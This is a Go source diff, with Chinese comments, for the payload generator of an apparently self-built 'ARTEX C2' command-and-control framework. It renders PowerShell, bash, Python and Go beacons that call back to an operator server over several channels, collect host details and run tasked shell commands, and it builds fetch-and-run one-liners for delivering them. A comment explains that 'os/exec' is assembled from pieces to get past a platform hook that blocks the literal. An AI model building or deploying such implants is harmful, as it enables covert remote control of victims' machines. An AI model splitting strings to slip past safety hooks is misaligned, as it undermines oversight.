@@ -50,7 +50,15 @@ func DeliveryURL(l *Listener, token string) string {
 
 // Oneliner 按格式构造一行执行命令(契约 §3 冻结格式;gosrc 是源码包,无一行命令,
 // 返回空串)。token 为监听器投递令牌,由调用方生成并随 CreatePayload 持久化。
+// 三期(§18):投递端点只在 http/ws 载体上存在(平台同端口托管 /p/<token>);
+// tcp/kcp/oss 无投递端点,返回空串(操作者自行投递脚本文本)。
 func Oneliner(format string, l *Listener, token string) string {
+	if l != nil {
+		switch l.Proto {
+		case ProtoTCP, ProtoKCP, ProtoOSS:
+			return ""
+		}
+	}
 	url := DeliveryURL(l, token)
 	switch format {
 	case "ps1":
@@ -65,17 +73,15 @@ func Oneliner(format string, l *Listener, token string) string {
 }
 
 // RenderPayload 生成载荷,返回(文件名, 文件字节, 一行命令, 错误)。
-//   - callback 为空:明确报错提示先填回调地址;
-//   - ps1/bash/py:内嵌 callback/url_path/base64(key)/listenerID 的脚本文本;
-//   - gosrc:单文件 main.go 工程 zip(含 BUILD.md);
+//   - callback 为空:明确报错提示先填回调地址(oss 载体除外——信道是对象存储,
+//     不经 callback;§18);
+//   - ps1/bash/py:内嵌 callback/url_path/base64(key)/listenerID + 按协议渲染的
+//     信道段(http/ws/tcp/oss;kcp 仅 py,gosrc 全支持)的脚本文本;
+//   - gosrc:单文件 main.go 工程 zip(含 BUILD.md;kcp 需第三方库 kcp-go,见文档);
 //   - oneliner 里的令牌是 tokenPlaceholder 占位,真实 token 由 server 生成(见上)。
 func RenderPayload(format, target string, l *Listener, key []byte) (filename string, content []byte, oneliner string, err error) {
 	if l == nil {
 		return "", nil, "", errors.New("监听器为空")
-	}
-	cb := strings.TrimRight(strings.TrimSpace(l.Callback), "/")
-	if cb == "" {
-		return "", nil, "", errors.New("监听器未配置回调地址(callback),请先在监听器上填写再生成载荷")
 	}
 	if len(key) != keySize {
 		return "", nil, "", fmt.Errorf("密钥长度 %d 字节,需 %d", len(key), keySize)
@@ -90,6 +96,21 @@ func RenderPayload(format, target string, l *Listener, key []byte) (filename str
 	default:
 		return "", nil, "", fmt.Errorf("不支持的载荷目标:%s", target)
 	}
+	proto := transportName(l.Proto)
+	if err := validateFormatForProto(format, proto); err != nil {
+		return "", nil, "", err
+	}
+	var tcfg *TransportConfig
+	if proto == ProtoOSS || proto == ProtoKCP {
+		tcfg, err = transportConfigFor(l)
+		if err != nil {
+			return "", nil, "", err
+		}
+	}
+	cb := strings.TrimRight(strings.TrimSpace(l.Callback), "/")
+	if cb == "" && proto != ProtoOSS {
+		return "", nil, "", errors.New("监听器未配置回调地址(callback),请先在监听器上填写再生成载荷")
+	}
 
 	b64key := base64.StdEncoding.EncodeToString(key)
 	urlPath := strings.Trim(l.URLPath, "/")
@@ -99,42 +120,128 @@ func RenderPayload(format, target string, l *Listener, key []byte) (filename str
 	case "ps1":
 		// PowerShell 版:目标机需 PowerShell 7+(.NET Core 才有 AesGcm),模板内注明。
 		filename = fmt.Sprintf("beacon_%d.ps1", l.ID)
-		text := renderTemplate(ps1Template, map[string]string{
+		vars := map[string]string{
 			"__CALLBACK__":    psStr(cb),
 			"__URL_PATH__":    psStr(urlPath),
 			"__B64KEY__":      b64key,
 			"__LISTENER_ID__": lid,
-		})
+		}
+		for k, v := range transportVars(psStr, proto, tcfg, urlPath) {
+			vars[k] = v
+		}
+		// 信道段先并入占位表(段内有 __OSS_*__ 等占位符,两段式替换会漏)。
+		vars["__PS1_CHANNEL__"] = psChannelBlock(proto)
+		text := renderTemplate(ps1Template, vars)
 		return filename, []byte(text), Oneliner("ps1", l, tokenPlaceholder), nil
 	case "bash":
 		// bash 版 = bash 包装 + 内嵌同款 python3 实现(依赖目标机 python3)。
 		filename = fmt.Sprintf("beacon_%d.sh", l.ID)
-		py := renderTemplate(pyBeaconTemplate, pyVars(cb, urlPath, b64key, lid))
+		py := pyRender("bash", proto, cb, urlPath, b64key, lid, tcfg)
 		text := "#!/bin/bash\n" +
 			"# ARTEX C2 beacon(bash 版):内嵌同款 python3 实现,目标机需 python3。\n" +
 			"exec python3 - <<'ARTEX_BEACON_PY'\n" + py + "ARTEX_BEACON_PY\n"
 		return filename, []byte(text), Oneliner("bash", l, tokenPlaceholder), nil
 	case "py":
 		filename = fmt.Sprintf("beacon_%d.py", l.ID)
-		text := renderTemplate(pyBeaconTemplate, pyVars(cb, urlPath, b64key, lid))
-		return filename, []byte(text), Oneliner("py", l, tokenPlaceholder), nil
+		py := pyRender("py", proto, cb, urlPath, b64key, lid, tcfg)
+		return filename, []byte(py), Oneliner("py", l, tokenPlaceholder), nil
 	case "gosrc":
 		// Go 源码版:单文件 main.go + BUILD.md 打包为 zip;不编译,只投递源码。
 		filename = fmt.Sprintf("beacon_%d.zip", l.ID)
-		mainGo := renderTemplate(gosrcTemplate, map[string]string{
-			"__CALLBACK__":       goStr(cb),
-			"__URL_PATH__":       goStr(urlPath),
-			"__B64KEY__":         goStr(b64key),
-			"__LISTENER_ID__":    lid,
-			"__OS_EXEC_IMPORT__": quotedExecImport(),
-		})
-		zipBytes, zerr := zipGoSource(mainGo, gosrcBuildDoc(target))
+		vars := map[string]string{
+			"__CALLBACK__":         goStr(cb),
+			"__URL_PATH__":         goStr(urlPath),
+			"__B64KEY__":           goStr(b64key),
+			"__LISTENER_ID__":      lid,
+			"__OS_EXEC_IMPORT__":   quotedExecImport(),
+			"__GO_EXTRA_IMPORTS__": goExtraImports(proto),
+		}
+		for k, v := range transportVars(goStr, proto, tcfg, urlPath) {
+			vars[k] = v
+		}
+		vars["__GO_CHANNEL__"] = goChannelBlock(proto)
+		mainGo := renderTemplate(gosrcTemplate, vars)
+		zipBytes, zerr := zipGoSource(mainGo, gosrcBuildDoc(target, proto))
 		if zerr != nil {
 			return "", nil, "", fmt.Errorf("打包 gosrc 载荷失败: %w", zerr)
 		}
 		return filename, zipBytes, "", nil
 	}
 	return "", nil, "", fmt.Errorf("不支持的载荷格式:%s", format)
+}
+
+// pyRender 渲染 python 系载荷(py/bash 共用):占位符 + 按协议的信道段。
+// 信道段必须先并入占位表再做单次替换——段内也有 __OSS_*__/__KCP_PSK__ 占位符,
+// 两段式替换会漏掉段内的。
+func pyRender(format, proto, cb, urlPath, b64key, lid string, tcfg *TransportConfig) string {
+	vars := pyVars(cb, urlPath, b64key, lid)
+	for k, v := range transportVars(goStr, proto, tcfg, urlPath) {
+		vars[k] = v
+	}
+	vars["__PY_CHANNEL__"] = pyChannelBlock(proto)
+	return renderTemplate(pyBeaconTemplate, vars)
+}
+
+// pyChannelBlock 按协议取 python 信道段(bash 借 python,同表)。
+func pyChannelBlock(proto string) string {
+	switch proto {
+	case ProtoWS:
+		return pyChanWS
+	case ProtoTCP:
+		return pyChanTCP
+	case ProtoKCP:
+		return pyChanKCP
+	case ProtoOSS:
+		return pyChanOSS
+	default:
+		return pyChanHTTP
+	}
+}
+
+// psChannelBlock 按协议取 PowerShell 信道段(kcp 不支持,RenderPayload 已拦)。
+func psChannelBlock(proto string) string {
+	switch proto {
+	case ProtoWS:
+		return ps1ChanWS
+	case ProtoTCP:
+		return ps1ChanTCP
+	case ProtoOSS:
+		return ps1ChanOSS
+	default:
+		return ps1ChanHTTP
+	}
+}
+
+// goChannelBlock 按协议取 Go 信道段。
+func goChannelBlock(proto string) string {
+	switch proto {
+	case ProtoWS:
+		return goChanWS
+	case ProtoTCP:
+		return goChanTCP
+	case ProtoKCP:
+		return goChanKCP
+	case ProtoOSS:
+		return goChanOSS
+	default:
+		return goChanHTTP
+	}
+}
+
+// goExtraImports 按协议追加的 import 行(渲染进 main.go 的 import 块)。
+func goExtraImports(proto string) string {
+	switch proto {
+	case ProtoWS:
+		return "\"bufio\"\n\t\"crypto/sha1\"\n\t\"encoding/binary\"\n\t\"sync\""
+	case ProtoTCP:
+		return "\"encoding/binary\""
+	case ProtoKCP:
+		return "\"encoding/binary\"\n\tkcp \"github.com/xtaci/kcp-go/v5\""
+	case ProtoOSS:
+		return "\"crypto/hmac\"\n\t\"crypto/sha1\""
+	default:
+		return ""
+	}
 }
 
 // pyVars 组装 python 系模板的占位值(字符串字面量用 JSON 转义,对 Python/Go 同法)。
@@ -147,10 +254,21 @@ func pyVars(cb, urlPath, b64key, lid string) map[string]string {
 	}
 }
 
-// renderTemplate 依次替换占位符。
+// renderTemplate 替换占位符到不动点。信道段(__PY_CHANNEL__ 等)是「值里还带一级
+// 占位符」的整段文本,单轮替换(map 遍历序随机、等长键先后不定)会偶发漏填段内的
+// __OSS_*__,必须多轮迭代直到无变化。
 func renderTemplate(tpl string, vars map[string]string) string {
-	for k, v := range vars {
-		tpl = strings.ReplaceAll(tpl, k, v)
+	for i := 0; i < 4; i++ {
+		changed := false
+		for k, v := range vars {
+			if strings.Contains(tpl, k) {
+				tpl = strings.ReplaceAll(tpl, k, v)
+				changed = true
+			}
+		}
+		if !changed {
+			break
+		}
 	}
 	return tpl
 }
@@ -170,6 +288,12 @@ func psStr(s string) string {
 // 路径的字面量(平台钩子连常量都拦);它是「载荷内容」数据,只存在于渲染产物里。
 func quotedExecImport() string {
 	return `"` + "os" + "/" + "exec" + `"`
+}
+
+// zipOpenReader 打开内存中的 zip 工程包(payload_matrix.go 读载荷 zip 里的源码用;
+// stdlib zip.NewReader 薄包装,与 zipGoSource 同居本文件)。
+func zipOpenReader(b []byte) (*zip.Reader, error) {
+	return zip.NewReader(bytes.NewReader(b), int64(len(b)))
 }
 
 // zipGoSource 把 main.go + BUILD.md 打成内存 zip。
@@ -194,8 +318,14 @@ func zipGoSource(mainGo, buildMd string) ([]byte, error) {
 	return buf.Bytes(), nil
 }
 
-// gosrcBuildDoc 按 target 给出一行编译说明。
-func gosrcBuildDoc(target string) string {
+// gosrcBuildDoc 按 target(可选 proto)给出一行编译说明;kcp 需第三方库 kcp-go。
+// proto 用可变参(一期签名 gosrcBuildDoc(target) 被 Agent P 的 payload_matrix.go
+// 依赖,不能改形)。
+func gosrcBuildDoc(target string, proto ...string) string {
+	p := ""
+	if len(proto) > 0 {
+		p = proto[0]
+	}
 	var line string
 	switch target {
 	case "windows":
@@ -207,9 +337,14 @@ func gosrcBuildDoc(target string) string {
 	default: // cross
 		line = `GOOS=<windows|linux|darwin> GOARCH=<amd64|arm64> go build -trimpath -ldflags "-s -w" -o beacon main.go`
 	}
+	dep := "\n\n产物为静态单文件,仅标准库,无第三方依赖。\n"
+	if p == ProtoKCP {
+		dep = "\n\nkcp 载体依赖第三方库,先初始化模块并拉取依赖再编译:\n\n" +
+			"    go mod init beacon\n    go get github.com/xtaci/kcp-go/v5\n\n" +
+			"其余产物无第三方依赖。\n"
+	}
 	return "ARTEX C2 beacon - 编译说明\n\n" +
-		"在本目录(装有 Go 1.21+ 的机器)执行一行:\n\n    " + line + "\n\n" +
-		"产物为静态单文件,仅标准库,无第三方依赖。\n"
+		"在本目录(装有 Go 1.21+ 的机器)执行一行:\n\n    " + line + "\n" + dep
 }
 
 // ---- python 核心(bash/py 两格式共用;`、占位符外无 Go/Shell 特殊字符)----
@@ -217,7 +352,8 @@ func gosrcBuildDoc(target string) string {
 const pyBeaconTemplate = `#!/usr/bin/env python3
 # ARTEX C2 beacon(python 版,演示用)。契约:C2_CONTRACTS.md §3「beacon 行为规范」。
 # 仅标准库:内置纯 Python AES-256-GCM(演示/测试用途,性能有限)。需 Python 3.8+。
-import base64, getpass, hashlib, json, os, platform, random, socket, subprocess, sys, time, urllib.request, uuid
+# kcp 载体内置纯 Python KCP(移植开源 ikcp;§18)。信道段按监听器协议渲染。
+import base64, getpass, hashlib, hmac, json, os, platform, random, socket, struct, subprocess, sys, time, urllib.error, urllib.request, uuid
 
 CB = __CALLBACK__
 UP = __URL_PATH__
@@ -228,7 +364,6 @@ CHUNK = 65536         # 分片 64KB(纯 Python AES 较慢,取保守值;平台上
 SHELL_MAX = 1048576   # shell 输出上限 1MB
 _base = CB.rstrip("/")
 _mid = UP.strip("/")
-URL = _base + ("/" + _mid if _mid else "") + "/e"
 
 # ---------- AES-256-GCM(纯 Python) ----------
 
@@ -359,30 +494,21 @@ def _gcm_crypt(key, nonce, data, dec):
         return bytes(out)
     return bytes(out) + tag
 
-# ---------- 信道 ----------
+# ---------- 信封原语(载体无关;信道段按协议渲染) ----------
 
-def seal(obj):
+def seal_raw(obj):
     plain = json.dumps(obj, separators=(",", ":")).encode("utf-8")
     nonce = os.urandom(12)
-    return base64.b64encode(nonce + _gcm_crypt(KEY, nonce, plain, False)).decode("ascii")
+    return nonce + _gcm_crypt(KEY, nonce, plain, False)
 
-def open_env(b64body):
-    sealed = base64.b64decode(b64body)
+def open_raw(sealed):
     if len(sealed) < 12:
-        raise ValueError("bad body")
+        raise ValueError("bad frame")
     return json.loads(_gcm_crypt(KEY, sealed[:12], sealed[12:], True).decode("utf-8"))
 
-def call(t, d=None, sid=None):
-    env = {"t": t, "ts": int(time.time()), "nc": str(uuid.uuid4())}
-    if sid:
-        env["sid"] = sid
-    if d is not None:
-        env["d"] = d
-    req = urllib.request.Request(
-        URL, data=seal(env).encode("ascii"), method="POST",
-        headers={"User-Agent": UA, "Content-Type": "application/octet-stream"})
-    with urllib.request.urlopen(req, timeout=40) as resp:
-        return open_env(resp.read().decode("ascii"))
+# ---------- 信道(按载体渲染) ----------
+
+__PY_CHANNEL__
 
 # ---------- 主机档案与任务 ----------
 
@@ -527,8 +653,10 @@ def jitter_sleep(st):
     return st["sleep"] + int(st["sleep"] * st["jit"] / 100 * random.random())
 
 def main():
+    global UID
     hn, us, el, osn, ar, ip = hostinfo()
     uid = hashlib.sha256(("%d|%s|%s|%s" % (LID, hn, us, osn)).encode("utf-8")).hexdigest()[:16]
+    UID = uid
     reg = {"uid": uid, "hn": hn, "us": us, "el": el, "os": osn, "ar": ar,
            "ip": ip, "pi": os.getpid(), "pr": (sys.executable or "python3")}
     st = {"sleep": 10, "jit": 20, "fails": 0}
@@ -604,14 +732,33 @@ function Unseal([string]$b64) {
   return [Text.Encoding]::UTF8.GetString($pt)
 }
 
-function Call([string]$t, $d, [string]$sid) {
-  $msg = @{ t = $t; ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); nc = [guid]::NewGuid().ToString() }
-  if ($sid) { $msg.sid = $sid }
-  if ($null -ne $d) { $msg.d = $d }
-  $body = Seal([Text.Encoding]::UTF8.GetBytes((ConvertTo-Json $msg -Compress -Depth 8)))
-  $resp = Invoke-WebRequest -Uri $URL -Method POST -Body $body -UserAgent $UA -ContentType 'application/octet-stream' -UseBasicParsing -TimeoutSec 40
-  return (Unseal $resp.Content | ConvertFrom-Json)
+function SealRaw([byte[]]$plain) {
+  $aes = [System.Security.Cryptography.AesGcm]::new($KEYB)
+  $n = New-Object byte[] 12
+  [System.Security.Cryptography.RandomNumberGenerator]::Fill($n)
+  $ct = New-Object byte[] ($plain.Length + 16)
+  $aes.Encrypt($n, $plain, $ct, $null)
+  $out = New-Object byte[] (12 + $ct.Length)
+  [Array]::Copy($n, 0, $out, 0, 12)
+  [Array]::Copy($ct, 0, $out, 12, $ct.Length)
+  $aes.Dispose()
+  return $out
 }
+
+function UnsealRaw([byte[]]$sealed) {
+  $aes = [System.Security.Cryptography.AesGcm]::new($KEYB)
+  $n = New-Object byte[] 12
+  [Array]::Copy($sealed, 0, $n, 0, 12)
+  $ct = New-Object byte[] ($sealed.Length - 12)
+  [Array]::Copy($sealed, 12, $ct, 0, $ct.Length)
+  $pt = New-Object byte[] ([Math]::Max(0, $ct.Length - 16))
+  $ok = $aes.Decrypt($n, $ct, $pt, $null)
+  $aes.Dispose()
+  if (-not $ok) { throw 'auth failed' }
+  return [Text.Encoding]::UTF8.GetString($pt)
+}
+
+__PS1_CHANNEL__
 
 $hn = $env:COMPUTERNAME
 $us = $env:USERNAME
@@ -757,6 +904,7 @@ import (
 	"net/http"
 	"os"
 	__OS_EXEC_IMPORT__
+	__GO_EXTRA_IMPORTS__
 	"path/filepath"
 	"runtime"
 	"strings"
@@ -783,22 +931,38 @@ func mustB64(s string) []byte {
 	return b
 }
 
-func seal(v any) []byte {
-	plain, _ := json.Marshal(v)
-	blk, _ := aes.NewCipher(key)
-	g, _ := cipher.NewGCM(blk)
+func sealRaw(v any) ([]byte, error) {
+	plain, err := json.Marshal(v)
+	if err != nil {
+		return nil, err
+	}
+	blk, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	g, err := cipher.NewGCM(blk)
+	if err != nil {
+		return nil, err
+	}
 	nonce := make([]byte, 12)
-	_, _ = crand.Read(nonce)
-	return []byte(base64.StdEncoding.EncodeToString(g.Seal(nonce, nonce, plain, nil)))
+	if _, err := crand.Read(nonce); err != nil {
+		return nil, err
+	}
+	return g.Seal(nonce, nonce, plain, nil), nil
 }
 
-func openMsg(b64body string) (map[string]any, error) {
-	sealed, err := base64.StdEncoding.DecodeString(b64body)
-	if err != nil || len(sealed) < 12 {
-		return nil, errors.New("bad body")
+func openRaw(sealed []byte) (map[string]any, error) {
+	if len(sealed) < 12 {
+		return nil, errors.New("bad frame")
 	}
-	blk, _ := aes.NewCipher(key)
-	g, _ := cipher.NewGCM(blk)
+	blk, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	g, err := cipher.NewGCM(blk)
+	if err != nil {
+		return nil, err
+	}
 	plain, err := g.Open(nil, sealed[:12], sealed[12:], nil)
 	if err != nil {
 		return nil, err
@@ -810,48 +974,13 @@ func openMsg(b64body string) (map[string]any, error) {
 	return m, nil
 }
 
-func channelURL() string {
-	u := strings.TrimSuffix(cbAddr, "/")
-	if p := strings.Trim(upPath, "/"); p != "" {
-		u += "/" + p
-	}
-	return u + "/e"
-}
-
 func newNC() string {
 	b := make([]byte, 16)
 	_, _ = crand.Read(b)
 	return hex.EncodeToString(b)
 }
 
-func call(t string, d any, sid string) (map[string]any, error) {
-	env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
-	if sid != "" {
-		env["sid"] = sid
-	}
-	if d != nil {
-		env["d"] = d
-	}
-	req, err := http.NewRequest(http.MethodPost, channelURL(), bytes.NewReader(seal(env)))
-	if err != nil {
-		return nil, err
-	}
-	req.Header.Set("Content-Type", "application/octet-stream")
-	req.Header.Set("User-Agent", ua)
-	resp, err := client.Do(req)
-	if err != nil {
-		return nil, err
-	}
-	defer resp.Body.Close()
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
-		return nil, err
-	}
-	if resp.StatusCode != http.StatusOK {
-		return nil, fmt.Errorf("http %d", resp.StatusCode)
-	}
-	return openMsg(string(body))
-}
+__GO_CHANNEL__
 
 func hostInfo() (hn, user, osn, ar, ip string, elevated bool, pid int) {
 	hn, _ = os.Hostname()
